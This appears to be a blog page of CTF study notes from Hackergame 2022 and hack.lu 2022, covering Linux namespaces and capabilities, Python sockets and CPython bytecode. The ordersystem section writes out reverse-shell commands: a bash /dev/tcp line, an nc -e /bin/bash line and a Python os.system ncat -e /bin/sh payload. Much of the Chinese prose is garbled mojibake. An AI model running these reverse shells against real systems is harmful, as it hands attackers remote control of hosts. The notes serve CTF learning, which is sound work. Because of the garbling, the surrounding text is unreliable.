ç„¶ådbgç‰ˆæœ¬çš„åŒ…é‡Œé¢ä¹Ÿæ²¡æœ‰å¸¦ç¬¦å·çš„åº“æ–‡ä»¶. ä¸çŸ¥é“æ€ä¹ˆç”¨äº†, åˆ†æäº†åŠå¤©glibc-all-in-oneä»£ç ä¸çŸ¥é“æ€ä¹ˆæ”¹, ç´¢æ€§å°±æ²¡æœ‰ç¬¦å·å§. ä¸è¿‡åœ¨ubuntu2022é‡Œç›´æ¥è¿è¡Œ. </p><p>debian glibc file <a href="https://packages.debian.org/source/bookworm/glibc">catagory</a> | <a href="https://mirror.tuna.tsinghua.edu.cn/debian/pool/main/g/glibc/">tuna</a> mirror site</p><p>ä¸ä¼šåš. </p><p>unintended solution:</p><p>breakpoint before the level is printed, make it print the last level instead, it will segfault, but the decoded map is in memory</p><hr><p>éšä¾¿çœ‹åˆ°ä¸€é¢˜éƒ½æœ‰ä¸‰ä¸ªæ ‡ç­¾, cry, misc, pwn, æ²¡æ¥è§¦è¿‡çš„åŠ å¯†å’Œæ‚é¡¹, å±å®ä¸ä¼š, è¿˜æœ‰ä¸€äº›è™šæ‹Ÿæœºé€ƒé€¸åŠ ä¸Šä»€ä¹ˆRISC-JITä¹‹ç±»æ²¡å¬è¯´è¿‡çš„æŠ€æœ¯. åˆ°å¤„éƒ½æ˜¯çŸ¥è¯†ç›²åŒº.</p><h1 id="Hackergame-2022"><a href="#Hackergame-2022" class="headerlink" title="Hackergame 2022"></a>Hackergame 2022</h1><p>ç®€å•é¢˜ç•¥è¿‡äº†, ä¸å¤ªæƒ³èŠ±æ—¶é—´. èƒ½åšçš„å­¦ä¸åˆ°ä¸œè¥¿, èƒ½å­¦åˆ°çš„åŸºæœ¬ä¸ä¼šåš. </p><p>çŒ«å’ªé—®ç­”: æ‡’å¾—åš. æ—…è¡Œå›¾ç‰‡: ç¤¾å·¥æ‡’å¾—åš. çº¯è€—æ—¶é—´. </p><p>ç­¾åˆ°: mousedownçš„äº‹ä»¶ç›‘å¬çš„touchStartå‡½æ•°åŠ ä¸Šä¸€ä¸ªlogpointè®©lefttimeä¸å˜</p><p>HeiLang: æ— èŠçš„è¯­æ³•è½¬æ¢</p><p>Flagè‡ªåŠ¨æœº: æ˜¯windowç¨‹åº, çœ‹äº†çœ‹IDAçš„åç¼–è¯‘ä»£ç åå‘ç°æœ‰æ¶ˆæ¯å›è°ƒå‡½æ•°, åœ¨cheat engineé‡Œè®©x, yå˜å¾—ä¸éšæœº, ç„¶åæ”¹ä¸€ä¸ªå˜é‡è¿›å…¥flagç”Ÿæˆ. </p><h2 id="One-byte-man"><a href="#One-byte-man" class="headerlink" title="One-byte-man"></a>One-byte-man</h2><p>æŒºç¥å¥‡çš„, ä»£ç é‡Œé¢åˆæ˜¯è¿˜æ²¡çœ‹çš„linuxæ¦‚å¿µâ€¦â€¦â€¦</p><ul><li><p>prctlå‚æ•°<code>PR_SET_CHILD_SUBREAPER</code>: è®¾ç½®è¿›ç¨‹æ ‘å±æ€§, ä½¿å¾—æ ‘ä¸­å­¤å„¿è¢«æ”¶å…»åˆ°æœ€è¿‘çš„<strong>è®¾ç½®äº†å±æ€§çš„</strong>çˆ¶è¿›ç¨‹å¤„.<br>å› ä¸ºè¯¥å±æ€§<strong>åªèƒ½é€šè¿‡</strong>execveç»§æ‰¿è€Œéforkå’Œclone. </p></li><li><p>è®¤çœŸçœ‹äº†ä¸‹namespaceçš„man page. <code>CLONE_NEW*</code>ä¸€ç³»åˆ—flag.  </p></li><li><p>user_namespace: A processâ€™s user and group IDs can be different inside and outside a user namespace. </p><ul><li>namespaceæ˜¯ä¸€ä¸ªæ ‘çŠ¶ç»§æ‰¿å›¾. åƒæ˜¯setnså’Œunshareå’Œcloneå¯ä»¥å¼€è¾Ÿæ–°çš„å­namespace</li><li><strong>User and group ID mappings: uid_map and gid_map</strong> <ul><li>root namespaceçš„ä¸¤ä¸ªæ–‡ä»¶ä¸­å¯ä»¥è§åˆ°<code>0          0 4294967295</code>, ç¬¬ä¸‰ä¸ªæ˜¯æœ‰ç¬¦å·æ•°çš„-1, å…¶å®æ˜¯æŒ‡ä¸€ä¸ªlength, è¿™ä¸€æ®µçš„uidéƒ½è¢«mapäº†. Since Linux 4.15æ¯ä¸ªè¿›ç¨‹å¯æœ‰340è¡Œæ˜ å°„. </li><li>ä¸åŒnamespaceçš„processè®¿é—®åŒä¸€ä¸ªprocessçš„uid_mapæ–‡ä»¶å¯èƒ½ä¼šäº§ç”Ÿä¸åŒçš„ç»“æœ. </li><li>å› ä¸ºè¯¥è¡Œæ˜¯ä¸€ä¸ªæ˜ å°„, å½“è®¿é—®æ–‡ä»¶åœ¨åŒä¸€ä¸ªnamespaceæŒ‡<code>å†…éƒ¨uid -&gt; çˆ¶space uid</code>, å½“åœ¨ä¸åŒnamespaceæ—¶æŒ‡<code>å†…éƒ¨uid -&gt; è®¿é—®è¿›ç¨‹space uid</code> </li><li>å†™å…¥çš„ç¨‹åºå¿…é¡»åœ¨çˆ¶spaceæˆ–è€…åŒä¸€ä¸ªspace; è¢«æ˜ å°„çš„uidåœ¨è¿›ç¨‹spaceå†…ä¹Ÿå¿…é¡»æœ‰map; æœ‰ç›¸åº”çš„caps.</li></ul></li></ul><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">sudo echo &#x27;0 1000 1\n1000 0 1&#x27; &gt; /proc/121634/uid_map<br></code></pre></div></td></tr></table></figure><ul><li>The <code>/proc/[pid]/setgroups</code> file<ul><li>setgroups() sets the <em><strong><u>supplementary group IDs</u></strong></em> for the calling process.</li><li>gid_mapæ²¡è®¾ç½®ä»¥åŠä¸Šé¢çš„æ–‡ä»¶æ˜¾ç¤ºâ€denyâ€æ—¶, ä¸èƒ½ç”¨setgroups()</li><li>gid_mapè®¾ç½®ä¹‹å(setgroupså·²ç¡®å®šæ˜¯å¦å¯ç”¨)ä¸èƒ½é€šè¿‡å†™å…¥<strong>ä»»ä½•å­—ç¬¦</strong>æ¥æ”¹å˜.<br>è¿›ç¨‹åªèƒ½ä»ç¦æ­¢setgroups(æœªmap)å˜åŒ–åˆ°å…è®¸setgroups(å†™å…¥allow)</li><li>åœ¨Linux 3.19è¢«åŠ å…¥. è§£å†³äº†â€rwxâ€”rwxâ€æ–‡ä»¶çš„é—®é¢˜. å³æ¢åˆ°other useråè€Œææƒäº†, by denying any pathway for an unprivileged process to drop groups with setgroups(2).</li></ul></li><li><code>/proc/sys/kernel/overflowuid</code>: æœªmapæ—¶å°è¯•è¯»å–uidä¼šæ˜¾ç¤ºçš„æ•°å­—. åœ¨uid_mapç¬¬äºŒä¸ªfieldæ²¡æœ‰mapæ—¶ä¹Ÿå¯èƒ½æ˜¾ç¤º4294967295.</li><li>æƒé™æ£€æŸ¥æ—¶uidä¼šè½¬æ¢åˆ°initial user namespaceä¸­çš„uid. </li></ul></li><li><p>capabilities:</p><ul><li>è¿›ç¨‹æœ‰å››ä¸ªset, æ–‡ä»¶æœ‰på’ŒiåŠ ä¸Šä¸€ä¸ªeffective bit.</li><li>å››ä¸ªsetçœ‹äº†è€åŠå¤©ä¸çŸ¥é“å®é™…æ˜¯å¦‚ä½•æ“ä½œçš„, åªæœ‰effectiveå’Œboundingèƒ½çœ‹æ˜ç™½. boundingåº”è¯¥æ˜¯ä¸ªå…¨é›†, ä¸è¿‡ä¹Ÿèƒ½å¤Ÿå¯¹å…¶è¿›è¡Œåˆ å‡, æ„ä¹‰ä¸æ˜. permitted setåº”è¯¥ä¸ºè¯¥è¿›ç¨‹å…è®¸è·å¾—çš„caps. ambientæ›´æ˜¯<strong>å®Œå…¨ä¸æ‡‚</strong>. </li><li>ä¸‹å›¾æ˜¯æ‰§è¡Œexecveæ—¶capçš„å˜åŒ–æƒ…å†µ. æ³¨æ„åˆ°å½“æ–‡ä»¶effective bitä¸º1æ—¶æ–‡ä»¶çš„permittedåŠ å…¥äº†effective set, è¿™ä¹Ÿæ˜¯ä¸€äº›blogæ¼”ç¤ºpingæ–‡ä»¶çš„åˆ©ç”¨ä¹‹å¤„, å³<code>cap_net_raw+ep</code>; è¿™å’Œambientæœ‰å•¥ä¸åŒ?</li></ul><img src="../../image/recent_ctf/image-20221026212243834.png" alt="image-20221026212243834" style="zoom:80%;" /></li><li><p>credentials</p><ul><li>çœ‹åˆ°è¿˜æœ‰ä¸ªFilesystem user ID and filesystem group ID, åªèƒ½è¯´ä¸çŸ¥é“æœ‰ä»€ä¹ˆç”¨, åªçœ‹åˆ°æ˜¯å’Œsupplementary group IDsä¸€èµ·ç”¨äºåˆ¤æ–­æ–‡ä»¶access permissions.</li><li>Supplementary group IDs: ä¸€ä¸ªç”¨æˆ·å±äºä¸€ä¸ªprimary group, åŒæ—¶åˆå±äºå¤šä¸ªSupplementary group, è¿™æ ·å°±ä¸ç”¨åˆ‡æ¢äº†, ä¸»è¦æ˜¯çœäº‹. åœ¨<code>id</code>å‘½ä»¤ç¬¬ä¸€ä¸ªgroupåé¢è·Ÿç€çš„ä¸œè¥¿å°±æ˜¯. </li></ul></li><li><p><code>capsh getcap setcap getpcaps</code> å’Œ <code>grep Cap /proc/self/status</code> </p></li></ul><h2 id="çœ‹ä¸è§çš„å½¼æ–¹"><a href="#çœ‹ä¸è§çš„å½¼æ–¹" class="headerlink" title="çœ‹ä¸è§çš„å½¼æ–¹"></a>çœ‹ä¸è§çš„å½¼æ–¹</h2><p>é¢, å…ˆçœ‹rustå»äº†. </p><h1 id="hack-lu-2022"><a href="#hack-lu-2022" class="headerlink" title="hack.lu 2022"></a>hack.lu 2022</h1><h2 id="ordersystem"><a href="#ordersystem" class="headerlink" title="ordersystem"></a>ordersystem</h2><h3 id="start"><a href="#start" class="headerlink" title="start"></a>start</h3><p>ä¸€çœ¼çœ‹åˆ°pythonä¸­<code>socket.socket()</code> å…ˆæŸ¥ä¸€ä¸‹ä»¥å‰æ²¡æ³¨æ„çš„ä¸œè¥¿.</p><ul><li><p><code>setsockopt</code>ä½¿ç”¨åœºæ™¯: <a href="https://zhuanlan.zhihu.com/p/77023584">link</a> </p></li><li><p>reuseaddr/reuseport: <a href="https://www.jianshu.com/p/9cc2b5b9ad4d">æŸ¥è¯¢è¿‡ç¨‹æºç </a> <a href="https://segmentfault.com/a/1190000020524323">reuseportç‰ˆæœ¬æ¼”è¿›</a> </p></li><li><p>bindåˆ° 0.0.0.0, 127.0.0.1 localhost æœ‰ä½•<a href="https://stackoverflow.com/questions/20778771">åŒºåˆ«</a> </p></li><li><p>åœ¨dockerç¯å¢ƒä¸Šé‡åˆ°ä¸€ç‚¹å°é—®é¢˜, é‡æ–°buildäº†ä¸€ä¸‹. wocä¸ºä»€ä¹ˆé“¾æ¥æ²¡ååº”?? å¥½å§é‡å¯è§£å†³é—®é¢˜äº†. <code>service docker restart</code> </p></li><li><p><a href="https://www.cnblogs.com/pandana/p/16289320.html">åå¼¹shell</a> </p><ul><li><p>ç›®æ ‡è¦æ‰§è¡Œçš„å‘½ä»¤: <code>bash -i &gt;&amp; /dev/tcp/192.168.1.102/7777 0&gt;&amp;1</code>: å°†ç›®æ ‡ä¸»æœºçš„bash shellä»¥-iäº¤äº’å¼çš„æ–¹å¼ï¼Œæ ‡å‡†è¾“å‡º+é”™è¯¯è¾“å‡ºé‡å®šå‘åˆ°192.168.1.102:7777ï¼Œè€Œåœ¨192.168.1.102:7777çš„æ ‡å‡†è¾“å…¥å‘½ä»¤ä¼šé‡å®šå‘åˆ°192.168.1.102:7777çš„æ ‡å‡†è¾“å‡ºä¸­ï¼‰</p><p><strong>ç®€è¨€è€ŒçŸ¥ï¼Œå°±æ˜¯å°†ç›®æ ‡ä¸»æœºçš„æ ‡å‡†è¾“å…¥ã€æ ‡å‡†è¾“å‡ºã€é”™è¯¯è¾“å‡ºå…¨éƒ½é‡å®šå‘åˆ°æ”»å‡»ç«¯ä¸Š</strong> </p></li><li><p>ä¸Šé¢è¿™ç§æ˜¯é€šè¿‡bashå‘½ä»¤æ¥åå¼¹shell, è¿˜å¯ä»¥é€šè¿‡<a href="https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/">python nc perl phpå‘½ä»¤</a>æ¥reverse.<br><code>nc 192.168.100.113 4444 â€“e /bin/bash</code> </p><p><code>python -c â€˜import socket,subprocess,os;................â€™</code> </p></li><li><p>è€Œä¸»æœºè¦æ‰§è¡Œ<code>nc â€“lvp 4444</code>å‘½ä»¤æ¥ç›‘å¬ç‰¹å®šç«¯å£å·.</p></li></ul></li><li><p>pythonçš„bytecodeçœŸæ²¡äº†è§£è¿‡, è¦æš´æ¯™äº†. è¿™èƒ½ä¸Šå“ªå„¿æœ. è·Ÿcpythonæœ‰æŒºå¤§å…³ç³». åˆæŸ¥åˆ°äº†python vm. åˆæ˜¯pythonçš„fundamental, æˆ‘è¦ç–¯äº†æ€ä¹ˆåˆæ¥è¿™ä¹ˆå¤šçš„ä¸œè¥¿. ä¸€çœ‹å°±æ˜¯ä¸€æ˜ŸæœŸçš„é‡ahhhhhhhhhhhhhhhhhhhhh</p></li></ul><h3 id="Bytecode-relavant"><a href="#Bytecode-relavant" class="headerlink" title="Bytecode relavant:"></a>Bytecode relavant:</h3><p>åˆ°å¤„æŸ¥ä¸œè¥¿, å†™çš„æŒºä¹±çš„. è¿˜æ˜¯python innardséƒ¨åˆ†èƒ½çœ‹ä¸€ç‚¹. </p><ul><li>python <a href="https://docs.python.org/3/library/functions.html#__import__">built-in function</a>: the last one is <code>__import__</code>, This function is invoked by import statements. Direct use of <code>__import__()</code> is also discouraged in favor of <code>importlib.import_module()</code> <ul><li>e.g. <code>__import__(&#39;os&#39;).system(b&quot;ncat *.*.*.*&quot; &quot;****&quot; &quot;-e /bin/sh&quot;)</code> </li></ul></li><li>ops:<ul><li><code>LOAD_FAST</code>(<em>var_num</em>): Pushes a reference to the local <code>co_varnames[var_num]</code> onto the stack. </li><li><code>STORE_FAST</code>(<em>var_num</em>): Stores TOS into the local <code>co_varnames[var_num]</code>.</li><li><code>RETURN_VALUE</code> Returns with TOS to the caller of the function.</li><li><strong>å¯é€šè¿‡dis.opmapæŸ¥è¯¢instç¼–ç . æƒ³äº†ä¸€å°æ—¶æ€ä¹ˆå¼„â€¦â€¦ ç¬¬äºŒä¸ªå­—èŠ‚æ˜¯æ“ä½œæ•°, å°±æ˜¯disç»“æœçš„ç¬¬äºŒä¸ªæ•°å­—</strong>. </li><li><code>BUILD_TUPLE</code>(<em>count</em>): Creates a tuple consuming <em><strong>count</strong></em> items from the stack, and <strong>pushes</strong> the resulting tuple.</li><li><code>CALL_FUNCTION</code>(<em>argc</em>): <strong>pops all arguments</strong> and the <strong>callable object</strong>, makes call, and <strong>pushes the return value</strong>. <ul><li>æˆ‘çœŸæ²¡çœ‹å‡ºæ¥å“ªé‡ŒæŠŠå‚æ•°å…¨éƒ¨popå‡ºæ¥äº†â€¦â€¦å¯èƒ½æ˜¯å‡½æ•°å†…éƒ¨æ“ä½œçš„, switché‡Œcall_functionåæœ‰å¯¹stack_pointerçš„é‡æ–°èµ‹å€¼.</li><li>ç‰¹åˆ«çš„æ˜¯æ¯”å¦‚printå‡½æ•°æ˜¯æ²¡æœ‰è¿”å›å€¼çš„, ä½†æ­¤æ—¶ä»ä¼šæœ‰å€¼ä¸ºNoneçš„<code>PyObject*</code>è¢«å‹å…¥æ ˆä¸­.  åœ¨æœ¬é¢˜ä¸­ä»¤å…¶å‚æ•°ä¸º0ä¸ª, å¯ä½œä¸ºNoneçš„ä¸€ç§å‹å…¥æ–¹å¼. </li></ul></li><li><code>LOAD_METHOD</code>(<em>namei</em>): Loads a method named <code>co_names[namei]</code> <strong>from the TOS object</strong>. TOS is <strong>popped</strong>. <ul><li>if TOS has a method with the correct name, the bytecode pushes the unbound method and TOS. TOS will be used as the first argument (<code>self</code>) by <a href="https://docs.python.org/3.10/library/dis.html#opcode-CALL_METHOD"><code>CALL_METHOD</code></a> when calling the unbound method. </li><li>Otherwise, <code>NULL</code> and the object return by the attribute lookup are pushed. </li></ul></li><li><code>CALL_METHOD</code><em>(argc)</em> è¿™ä¸ªå‚æ•°æ˜¾è€Œæ˜“è§äº†. <ul><li>Positional arguments are on top <strong>+</strong> two items described in <code>LOAD_METHOD</code><br>(either <code>self</code> + an unbound method object <strong>or</strong> <code>NULL</code> + an arbitrary callable)</li><li>ç›´æ¥åœ¨3.11æ¶ˆå¤±äº†. å’Œ<code>LOAD_METHOD</code>è¿›è¡Œæ­é…çš„æ˜¯<code>PRECALL</code>. çœŸæ˜¯æ¯ä¸ªç‰ˆæœ¬éƒ½ä¸ä¸€æ ·â€¦. åˆ°æ—¶å€™å†çœ‹å§. </li></ul></li><li><code>IMPORT_NAME</code>(<em>namei</em>): Imports the module <code>co_names[namei]</code>. TOS and TOS1 are popped and provide the <em>fromlist</em> and <em>level</em> arguments of __import__(). The module object is pushed onto the stack. å®é™…ä¸ŠTOS1 ä¸éœ€è¦pop, åªè¦å¼•ç”¨ä¸‹ç„¶åç›´æ¥ä¿®æ”¹æˆè¿”å›å€¼å³å¯. <ul><li><code>IMPORT_NAME</code>ä¹‹åé€šå¸¸ä¼š<code>STORE_FAST</code>æ¥æš‚å­˜, éœ€è¦è°ƒç”¨<code>os.system</code>è¿™æ ·çš„æ—¶å€™å°±<code>LOAD_FAST</code>æ¥ä¸º<code>LOAD_METHOD</code>è·å–os module.</li><li>è¿˜å‘ç°äº†<code>IMPORT_STAR</code> <code>IMPORT_FROM</code>, å‰è€…æ˜¯ä»TOSä¸Šimportæ‰€æœ‰symbols , åè€…æ˜¯ä»TOSä¸Šimportç‰¹å®š, å’Œä¸Šé¢è¿™ä¸ªåªimport moduleçš„æ˜æ˜¾ä¸åŒ. </li></ul></li><li></li></ul></li><li>ä¸‹é¢æ˜¯ç¤ºä¾‹, åœ¨æ¯ä¸ªCALL_FUNCTIONä¹‹å‰éƒ½loadäº†å‡½æ•°å’Œå‚æ•°, æœ€ç»ˆæ“ä½œæ•°ä¸ºå‚æ•°çš„ä¸ªæ•°(15è¡Œçš„â€1â€). </li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">In [<span class="hljs-number">1</span>]: <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span>():</span><br>   ...:     <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;test string&quot;</span>)<br>    <br>In [<span class="hljs-number">2</span>]: <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_test</span>():</span><br>   ...:     test()<br>   ...:     <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;test_test string&quot;</span>)<br><br>In [<span class="hljs-number">3</span>]: <span class="hljs-keyword">import</span> dis<br>In [<span class="hljs-number">4</span>]: dis.dis(test_test)<br>  <span class="hljs-number">2</span>           <span class="hljs-number">0</span> LOAD_GLOBAL              <span class="hljs-number">0</span> (test)<br>              <span class="hljs-number">2</span> CALL_FUNCTION            <span class="hljs-number">0</span><br>              <span class="hljs-number">4</span> POP_TOP<br>  <span class="hljs-number">3</span>           <span class="hljs-number">6</span> LOAD_GLOBAL              <span class="hljs-number">1</span> (<span class="hljs-built_in">print</span>)<br>              <span class="hljs-number">8</span> LOAD_CONST               <span class="hljs-number">1</span> (<span class="hljs-string">&#x27;test_test string&#x27;</span>)<br>             <span class="hljs-number">10</span> CALL_FUNCTION            <span class="hljs-number">1</span>                     <br>             <span class="hljs-number">12</span> POP_TOP                                        <br>             <span class="hljs-number">14</span> LOAD_CONST               <span class="hljs-number">0</span> (<span class="hljs-literal">None</span>)              <br>             <span class="hljs-number">16</span> RETURN_VALUE                                   <br></code></pre></div></td></tr></table></figure><ul><li><del>çœ‹äº†ä¸€åœˆæˆ‘éƒ½ä¸çŸ¥é“ä»€ä¹ˆå«Calls the function in position 7 on the stack with the top three items on the stack as arguments.<br>4 5 6è¿™ä¸‰ä¸ªä½ç½®å°±æ²¡ç”¨äº†?? åˆç€åŸæ¥æ˜¯å¡«å……. æˆ‘æƒ³æˆ‘è¿˜æ˜¯çœ‹çœ‹python innardsæ¯”è¾ƒå¥½â€¦..è™½ç„¶æ˜¯10å¹´çš„post<br>ç„¶åå‘ç°åœ¨3.11çš„æ–‡æ¡£é‡Œæ˜¯position 4. å•Šè¿™? å¯èƒ½æ˜¯é¢„ç•™ä½ç½®é˜²æ­¢åæ¥åŠ å…¥ä¸œè¥¿</del><br>ä¸‹é¢æ˜¯<a href="https://github.com/python/cpython/blob/main/Python/generated_cases.c.h">cpythonæºç </a>. mainåˆ†æ”¯ä¸Šçš„ä¸åœ¨<code>ceval.c</code>ä¸­, å› ä¸ºcaseè¯­å¥å¤ªé•¿å°±ç›´æ¥åˆ†æˆä¸€ä¸ªå•ç‹¬çš„æ–‡ä»¶<code>generated_cases.c.h</code>, å…¶ä½™ç‰ˆæœ¬å·åˆ†æ”¯ä»åœ¨ceval. å·²ä¸‹è½½cpython 3.11æºç , å¯ä»¥çœ‹åˆ°ä¸€äº›å®šä¹‰ä¹‹ç±»çš„ä¸œè¥¿.  <ul><li>exception below: <a href="https://docs.python.org/3/c-api/exceptions.html#exception-classes">python doc</a> </li><li><code>exc_info()</code>: æ²¡çœ‹æ˜ç™½è¿™æ˜¯ä¸ªä»€ä¹ˆä¸œè¥¿, åªçŸ¥é“<code>sys.exc_info()</code>æœ‰åå‘å…¼å®¹æ€§, ç°åœ¨æ›´å¤šçš„æ˜¯ä½¿ç”¨traceback(?ä¸ç¡®å®šæ˜¯å“ªä¸ªtraceback)</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//branch 3.11:</span><br>TARGET(WITH_EXCEPT_START) &#123;<br>            <span class="hljs-comment">/* At the top of the stack are 4 values:</span><br><span class="hljs-comment">               - TOP = exc_info()</span><br><span class="hljs-comment">               - SECOND = previous exception</span><br><span class="hljs-comment">               - THIRD: lasti of exception in exc_info()</span><br><span class="hljs-comment">               - FOURTH: the context.__exit__ bound method</span><br><span class="hljs-comment">               We call FOURTH(type(TOP), TOP, GetTraceback(TOP)).</span><br><span class="hljs-comment">               Then we push the __exit__ return value.</span><br><span class="hljs-comment">            */</span><br>            PyObject *exit_func;<br>            PyObject *exc, *val, *tb, *res;<br><br>            val = TOP();<br>            assert(val &amp;&amp; PyExceptionInstance_Check(val));<br>            exc = PyExceptionInstance_Class(val);<br>            tb = PyException_GetTraceback(val);<br>            Py_XDECREF(tb);<br>            assert(PyLong_Check(PEEK(<span class="hljs-number">3</span>)));<br>            exit_func = PEEK(<span class="hljs-number">4</span>);<br>            PyObject *<span class="hljs-built_in">stack</span>[<span class="hljs-number">4</span>] = &#123;<span class="hljs-literal">NULL</span>, exc, val, tb&#125;;<br>            res = PyObject_Vectorcall(exit_func, <span class="hljs-built_in">stack</span> + <span class="hljs-number">1</span>,<br>                    <span class="hljs-number">3</span> | PY_VECTORCALL_ARGUMENTS_OFFSET, <span class="hljs-literal">NULL</span>);<br>            <span class="hljs-keyword">if</span> (res == <span class="hljs-literal">NULL</span>)<br>                <span class="hljs-keyword">goto</span> error;<br><br>            PUSH(res);<br>            DISPATCH();<br>        &#125;<br><br><span class="hljs-comment">//but in branch 3.9-10:</span><br>            <span class="hljs-comment">/* At the top of the stack are 7 values:</span><br><span class="hljs-comment">               - (TOP, SECOND, THIRD) = exc_info()</span><br><span class="hljs-comment">               - (FOURTH, FIFTH, SIXTH) = previous exception for EXCEPT_HANDLER</span><br><span class="hljs-comment">               - SEVENTH: the context.__exit__ bound method</span><br><span class="hljs-comment">               We call SEVENTH(TOP, SECOND, THIRD).</span><br><span class="hljs-comment">               Then we push again the TOP exception and the __exit__</span><br><span class="hljs-comment">               return value.</span><br><span class="hljs-comment">            */</span><br></code></pre></div></td></tr></table></figure><h3 id="Python-backgrounds-amp-Innards"><a href="#Python-backgrounds-amp-Innards" class="headerlink" title="Python backgrounds &amp; Innards"></a>Python backgrounds &amp; Innards</h3><p>ä¸€äº›å¤ªé€šç”¨çš„ä¸œè¥¿æŒªåˆ°è¿™é‡Œæ¥äº†.</p><blockquote><p>å…³äºpythonç¼–è¯‘ç³»ç»Ÿå†…éƒ¨åŸç†çš„ä¸€äº›é“¾æ¥, æš‚æ—¶å¯ä»¥ä¸ç”¨å…³æ³¨: (ä¸çœ‹å•¥ä¹Ÿä¸çŸ¥é“, åˆæ»šå›æ¥çœ‹äº†â€¦</p><ul><li>stackoverflow: <a href="https://stackoverflow.com/questions/3299648/python-compilation-interpretation-process">bytecode instance</a> | <a href="https://stackoverflow.com/questions/19916729/how-exactly-is-python-bytecode-run-in-cpython">theory</a>. ä¸€ç¯‡å·¨é•¿çš„<a href="https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d">æ–‡ç« </a>, è¿æŒ‡ä»¤éƒ½å…¨éƒ¨åˆ—å‡ºæ¥. </li><li>Wiki: <a href="https://en.wikipedia.org/wiki/Stack_machine">stack machine</a> vs. register machine<ul><li><a href="https://www.geeksforgeeks.org/computer-organization-instruction-formats-zero-one-two-three-address-instruction/">Instruction formats</a> are classified into different types depending upon the CPU organization. <a href="https://www.geeksforgeeks.org/introduction-of-stack-based-cpu-organization/">CPU organization</a> is again classified into three types based on internal storage: <strong>Stack machine</strong>, Accumulator machine, General purpose organization or General register.</li><li>Stack machines extend <a href="https://en.wikipedia.org/wiki/Push-down_automata">push-down automata</a>(ä¸‹æ¨è‡ªåŠ¨æœº) with additional load/store operations or multiple stacks and hence are Turing-complete. </li><li>å¼€å§‹çœ‹åˆ°ä¸Šä¸‹æ–‡æ— å…³è¯­æ³•ç­‰ç­‰, å¿«æ­»å»çš„è®°å¿†å¼€å§‹æ”»å‡»æˆ‘. ä¸€æ—¶çœ‹ä¸å®Œwiki, æ‰¾ç‚¹æµ…æ˜¾æ˜“æ‡‚çš„æ–‡ç« æ¥. <a href="https://users.ece.cmu.edu/~koopman/stack_computers/sec3_2.html">stackmachine book</a> | <a href="https://www.geeksforgeeks.org/stack-machine-in-computer-organisation/">Geek</a> </li></ul></li><li><a href="https://devguide.python.org/internals/compiler/index.html">python compiler design</a> : developerå®˜æ–¹æ–‡æ¡£, è¿™é‡Œé¢å¥½å¤š, ä½†æ˜¯çœ‹èµ·æŒºæœ‰ç”¨â€¦..çœ‹äº†ä¹Ÿä¸çŸ¥é“è¯´å•¥. è¿˜æ˜¯çœ‹ä»–çš„referenceæ–‡ç« .</li><li><a href="https://tech.blog.aknin.name/category/my-projects/pythons-innards/">python innards</a> : è®²è§£ceval.cå†…å®¹. <ul><li><a href="https://tech.blog.aknin.name/2010/04/02/pythons-innards-introduction/">innards introduction</a> å‰ç½®çŸ¥è¯†, æºœä¸€é. å¯æƒœå°±æ˜¯åå¹´å‰çš„ç»ˆç©¶æœ‰ç‚¹è¿‡æ—¶. </li></ul></li><li>è¿˜å¯ä»¥çœ‹çœ‹python <a href="https://docs.python.org/3/c-api">C API</a>. </li><li>è¿˜å¯ä»¥çœ‹çœ‹python referenceçš„<a href="https://docs.python.org/3.11/reference/datamodel.html#the-standard-type-hierarchy">data model</a> </li></ul></blockquote><p>çœŸçš„å¥½ä¹±, çœ‹åˆ°å•¥è®°ä¸‹å•¥äº†.</p><h4 id="Misc"><a href="#Misc" class="headerlink" title="Misc:"></a>Misc:</h4><ul><li><p>The function definitionâ€™s body is compiled into a <u><strong>code object.</strong></u> Then the function definition itself is compiled into code (inside the enclosing function body, module, etc.) that, when executed, builds a function object from that code object. (Once you think about how closures must work, itâ€™s obvious why it works that way. Each instance of the closure is a separate function object with the same code object.)</p></li><li><p>dis module: <a href="https://docs.python.org/3.10/library/dis.html#python-bytecode-instructions">bytecode instructions</a> </p><ul><li><p><em>Changed in version 3.6:</em> Use 2 bytes for each instruction. Previously the number of bytes varied by instruction.</p><p><em>Changed in version 3.10:</em> The argument of jump, exception handling and loop instructions is now the <strong>instruction offset</strong> rather than the byte offset.</p></li></ul></li><li><p>get information about live objects: <a href="https://docs.python.org/3/library/inspect.html#module-inspect">Inspect</a> </p><ul><li><a href="https://docs.python.org/3/library/inspect.html#types-and-members">Types and members</a> :<code>function.__code__.co_code</code> to get code 